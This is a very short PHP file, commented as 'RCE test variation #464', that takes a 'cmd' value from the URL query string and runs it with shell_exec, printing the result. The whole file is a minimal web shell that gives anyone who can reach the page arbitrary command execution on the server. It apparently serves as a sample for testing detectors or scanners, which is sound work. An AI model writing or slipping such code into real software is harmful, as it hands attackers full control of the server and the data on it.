<?php
// RCE test variation #464
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>